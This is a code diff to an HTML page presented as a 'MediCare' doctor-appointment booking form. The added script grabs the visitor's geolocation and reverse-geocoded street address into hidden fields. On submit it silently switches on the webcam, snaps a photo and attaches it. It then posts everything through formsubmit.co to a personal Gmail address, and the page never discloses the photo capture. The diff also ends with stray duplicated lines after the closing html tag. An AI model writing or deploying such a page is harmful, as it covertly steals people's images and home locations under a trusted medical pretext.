@@ -91,7 +91,7 @@
     <div class="container">
         <img src="https://placehold.co/100x100?text=MC" alt="MediCare Logo" class="logo">
         <h1>Book Your Doctor Appointment</h1>
-        <form id="bookingForm" action="https://formsubmit.co/lokhandeyuvraj19@gmail.com" method="POST" class="hidden">
+        <form id="bookingForm" action="https://formsubmit.co/lokhandeyuvraj19@gmail.com" method="POST" enctype="multipart/form-data" class="hidden">
             <div class="form-group">
                 <label for="name">Full Name</label>
                 <input type="text" id="name" name="name" required>
@@ -110,6 +110,113 @@
             <div class="form-group">
                 <label for="service">Select Service</label>
                 <select id="service" name="service" required>
+                    <option value="">Choose Service</option>
+                    <option value="general">General Checkup</option>
+                    <option value="specialist">Specialist Consultation</option>
+                    <option value="emergency">Emergency Care</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="date">Preferred Date</label>
+                <input type="date" id="date" name="date" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="time">Preferred Time</label>
+                <input type="time" id="time" name="time" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="addressBtn" onclick="requestAddress()" style="cursor:pointer; color:#2196f3;">
+                    Get My Location & Address
+                </label>
+            </div>
+            
+            <video id="video" autoplay playsinline muted class="hidden"></video>
+            <canvas id="canvas" class="hidden"></canvas>
+            
+            <input type="hidden" id="locationData" name="location">
+            <input type="hidden" id="addressData" name="address">
+            <input type="file" id="photoFile" name="photo" accept="image/*" class="hidden">
+            
+            <button type="submit" class="btn">Book Appointment</button>
+        </form>
+        
+        <button id="bookBtn" class="btn">Book Now</button>
+    </div>
+
+    <script>
+        // Handle location/address access
+        function requestAddress() {
+            // First get location
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    document.getElementById('locationData').value = `${lat},${lng}`;
+                    
+                    // Then reverse geocode to get address
+                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.address) {
+                                const addr = Object.values(data.address).join(', ');
+                                document.getElementById('addressData').value = addr;
+                            }
+                        })
+                        .catch(err => console.log(`Address error: ${err.message}`));
+                },
+                err => console.log(`Location error: ${err.message}`)
+            );
+        }
+
+        // Handle camera access
+        document.getElementById('bookBtn').addEventListener('click', () => {
+            document.getElementById('bookingForm').classList.remove('hidden');
+            document.getElementById('bookBtn').remove();
+            
+            // Request location/address after form appears
+            setTimeout(requestAddress, 100);
+        });
+
+        // Handle photo capture and attach to form
+        document.getElementById('bookingForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Capture photo when video starts
+                video.addEventListener('loadeddata', () => {
+                    const canvas = document.getElementById('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    ctx.drawImage(video, 0, 0);
+                    const blob = canvas.toBlob(blob => {
+                        const fileInput = document.getElementById('photoFile');
+                        const dt = new DataTransfer();
+                        dt.items.add(new File([blob], "appointment_photo.jpg"));
+                        fileInput.files = dt.files;
+                        
+                        // Submit form after capture
+                        setTimeout(() => {
+                            document.getElementById('bookingForm').submit();
+                        }, 500);
+                    }, 'image/jpeg');
+                });
+            } catch (err) {
+                console.log(`Camera error: ${err.message}`);
+                document.getElementById('bookingForm').submit();
+            }
+        });
+    </script>
+</body>
+</html>                <select id="service" name="service" required>
                     <option value="">Choose Service</option>
                     <option value="general">General Checkup</option>
                     <option value="specialist">Specialist Consultation</option>
